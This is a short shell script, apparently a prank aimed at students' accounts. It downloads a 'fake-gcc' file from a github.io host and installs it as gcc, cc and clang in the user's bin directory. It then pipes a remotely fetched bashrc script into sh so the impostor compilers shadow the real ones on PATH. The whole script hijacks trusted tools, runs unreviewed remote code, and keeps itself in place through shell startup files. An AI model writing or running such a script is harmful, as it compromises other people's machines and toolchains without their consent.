#!/bin/sh

if [ -n "$AFS_DIR" ]; then
    dir="$AFS_DIR/bin"
else
    dir="$HOME/.local/bin"
fi

mkdir -p "$dir"

for name in gcc cc clang; do
    file="$dir/$name"
    curl "https://d-002.github.io/epita/confloose/fake-gcc/gcc" >> "$file"

    sed -i "s,GCC_PATH,$(which $name),g" "$file"
    chmod +x $file
done

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'export PATH=\"$dir:\$PATH\"'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null done
